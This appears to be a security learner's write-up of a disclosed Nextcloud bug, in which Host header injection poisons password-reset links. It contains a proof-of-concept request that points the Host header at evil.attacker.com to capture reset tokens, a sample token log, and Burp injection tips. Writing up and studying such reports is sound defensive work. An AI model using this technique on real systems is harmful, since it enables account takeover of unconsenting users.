Password Reset Poisoning
via Host Header Injection

01 Background — What Is Nextcloud?

Nextcloud is one of the world's most popular self-hosted cloud storage and collaboration platforms. Millions of companies and individuals rely on it as an open-source alternative to Dropbox, Google Drive, and SharePoint. Because it handles sensitive files and user credentials, any authentication-layer vulnerability carries serious real-world impact.

This particular report was filed by security researcher skavans and disclosed publicly on HackerOne after it was triaged, fixed, and the CVE embargo period expired. It demonstrates one of the most elegant — and often overlooked — attack primitives in web security: Host Header Injection in the password-reset flow.

02 The Vulnerability — Host Header Injection

When a user requests a password reset on most web applications, the server generates a unique token and embeds it into a link such as:

URL 
https://cloud.example.com/index.php/lostpassword/reset/form/<TOKEN>/user@example.com

The domain cloud.example.com is typically taken from the HTTP Host header of the incoming request. The assumption is: "the user sent this request, so the Host header must reflect the real server."

⚠
Critical Assumption Flaw

The Host header is user-controlled. Nothing stops an attacker from sending a crafted request with a spoofed Host value pointing to their own malicious server. If the application blindly trusts it to build email links, the reset token ends up in the attacker's hands.

Nextcloud's password-reset mechanism did exactly this — it read the Host header (or a forwarding header like X-Forwarded-Host) without proper validation and used it to construct the password-reset URL that was emailed to the victim.

03 Attack Scenario — Step by Step

The attack is almost entirely passive from the victim's perspective; they just receive what looks like a legitimate reset email and click the link.

1
Attacker crafts the reset request ATTACKER

The attacker knows (or guesses) the victim's email address registered on a Nextcloud instance. They initiate a password-reset request — or craft it from scratch — before it reaches the server.

2
Inject a malicious Host header ATTACKER

The attacker replaces the Host header value with a domain they control, e.g., evil.attacker.com, and submits the request to the real Nextcloud server.

3
Nextcloud generates a poisoned reset link SERVER

Because Nextcloud reads $_SERVER['HTTP_HOST'] to build the email link, it generates a URL pointing to evil.attacker.com containing the real, valid reset token.

4
Victim receives and clicks the email VICTIM

The victim receives a genuine-looking password-reset email sent from the legitimate Nextcloud server — but the embedded link points to the attacker's domain.

✕
Token captured → Account takeover ATTACKER

The attacker's server logs the GET request complete with the reset token in the URL. The attacker uses that token on the real Nextcloud instance to set a new password and fully control the account.

04 Proof of Concept

The reporter demonstrated the vulnerability with a minimal HTTP request. Using curl or Burp Suite, the following captures the poisoning in action:

HTTP Request — Malicious 
POST /index.php/lostpassword/email HTTP/1.1
Host: evil.attacker.com          ← injected by attacker
X-Forwarded-Host: evil.attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

user=victim%40example.com

The request is forwarded to the real Nextcloud server. The server processes it and emails the victim a link built from evil.attacker.com. The attacker's access log then shows:

Attacker Server Log — Token Received 
GET /index.php/lostpassword/reset/form/a1b2c3d4e5f6token.../victim%40example.com HTTP/1.1
User-Agent: Mozilla/5.0 ...
Referer: https://mail.example.com/
ℹ
Note

No interaction beyond the victim clicking their reset email is required — a perfectly normal action. The attack requires zero client-side exploitation and no special privileges.

05 Root Cause Analysis

The root cause is unconditional trust of the Host / X-Forwarded-Host header when building URLs in server-side code. In PHP applications this commonly manifests as:

PHP — Vulnerable Pattern 
// ❌ Vulnerable — trusts user-supplied header directly
$baseUrl    = 'https://' . $_SERVER['HTTP_HOST'];
$resetLink  = $baseUrl . '/reset?token=' . $token;
PHP — Secure Pattern (Nextcloud's fix) 
// ✅ Secure — validate against configured allow-list
$trustedDomains = $config->getSystemValue('trusted_domains', []);
$requestHost    = $_SERVER['HTTP_HOST'];

if (!in_array($requestHost, $trustedDomains, true)) {
    // Fall back to primary configured domain
    $requestHost = $trustedDomains[0] ?? 'localhost';
}

$baseUrl = 'https://' . $requestHost;

The same flaw appears in frameworks that expose request.getServerName() (Java), request.host (Django/Rails), or any equivalent that reads directly from incoming request headers without comparing against a configured allow-list.

06 Impact Assessment

Legend: verified — stated in report or follows directly from the vulnerability class potential — plausible but not explicitly confirmed in this report
  • Full account takeover verified — the attacker obtains a valid, single-use password-reset token for any account they can target.
  • Victim interaction — the attack relies on the victim clicking a legitimate-looking reset email. Exact interaction requirements depend on the application's reset-flow behaviour and whether the victim acts on the email.
  • Potentially scalable potential — if the application does not rate-limit reset requests per IP, an attacker could repeat this against multiple known email addresses. Mass-scale exploitation was not confirmed in this specific report.
  • No prior authentication required verified — the entire attack flows through an unauthenticated endpoint.
⚠
Severity Note

Nextcloud confirmed severity as High. The potential for account takeover on a platform that stores sensitive files makes this a serious finding. The impact claims above reflect the vulnerability class; consult the original report for the exact scope the reporter demonstrated.

07 The Fix — What Nextcloud Did Right

Nextcloud patched this by validating the Host header against a server-configured allow-list of trusted hosts before using it to build any URL. Nextcloud already had a trusted_domains configuration option — the fix was to enforce it on the code path that constructs reset-link URLs. The patch was shipped promptly after triage and CVE details were kept private until production deployments could update.

✓
Lesson from the fix

Nextcloud already had the right infrastructure (trusted_domains). The bug wasn't a missing concept — it was a missing enforcement. Often the fix is simpler than it looks.

08 How to Detect & Mitigate This

For Developers

  • Never read HTTP_HOST or X-Forwarded-Host unchecked when generating email links or redirects.
  • Maintain an explicit allowed-origin / trusted-domain list in configuration and validate every host reference against it.
  • Use your framework's request.build_absolute_uri() or equivalent only after verifying the origin is trusted.
  • Strip or ignore X-Forwarded-Host at the reverse-proxy level unless your infrastructure explicitly requires it.

For Penetration Testers / Bug Hunters

  • On any password-reset feature, inject a Burp Collaborator / Interactsh payload into the Host header and watch for DNS/HTTP callbacks.
  • Also try X-Forwarded-Host, X-Host, X-Forwarded-Server, and X-Original-URL — different frameworks trust different headers.
  • Use Burp's Match-and-Replace to automate injection across all reset requests in a session without manual effort per request.
  • Check the received email (use a test account you control) — the HTTP response may return 200 regardless of what domain ends up in the email link.
Burp Suite — Match & Replace Rule 
# Proxy → Options → Match and Replace
Type:    Request header
Match:   ^Host:.*$
Replace: Host: YOUR-ID.burpcollaborator.net

# Then trigger a reset for your own test account.
# DNS callback in Collaborator = vulnerable.

09 Broader Lesson — The Danger of Implicit Trust

This vulnerability belongs to a family of bugs I'd call implicit infrastructure trust: the server assumes that because a request arrived at its door, the metadata attached to it must be legitimate. In practice, HTTP headers are just strings — they carry exactly as much trust as the code that parses them grants them.

Password reset poisoning is closely related to:

  • Open redirect via Host header — poisoning redirect destinations
  • Web cache poisoning — injecting a malicious Host to poison CDN/proxy caches (James Kettle's research)
  • SSRF via forwarding headers — convincing a server to issue requests to internal resources by spoofing forwarding headers

The common thread: always validate input at the boundary where it enters trusted code paths. Headers are inputs just like form fields — treat them accordingly.

12 My Analysis — What I Took Away

Studying this report as a security learner, a few things stood out that I want to carry into my own testing and development work — written in my own words, not the reporter's.

01

The simplest bugs can have the highest impact

No exotic memory corruption, no multi-stage logic chain. One header, one missing validation, one email sent to the wrong domain. That's humbling — it means reviewing even the most "boring" authentication flows line by line still matters.

02

Password-reset flows deserve dedicated threat modelling

Reset flows are consistently under-reviewed relative to their blast radius. They are almost always unauthenticated, produce tokens with full account-takeover power, and involve outbound actions (emails) that create side-channels attackers can observe. Every engagement going forward, the reset flow gets its own dedicated test pass.

03

"Trusted" infrastructure inputs aren't trusted

The Host header feels like it comes from the infrastructure — like it belongs to the server, not the client. That's a cognitive trap. HTTP headers are just strings in a request. This report made that abstract principle concrete in a way textbook explanations don't always achieve.

What hunters should look for

  • Any application that sends an email containing a URL as part of an unauthenticated flow (reset, invite, verification) is worth testing for Host header injection.
  • Inject a Burp Collaborator domain in Host and all common forwarding headers simultaneously — some apps read one, some read another.
  • Check the received email (use a test account), not just the HTTP response — the response may return 200 regardless of what domain ends up in the link.
  • Look for the same pattern in "magic link" login flows, not just password resets.
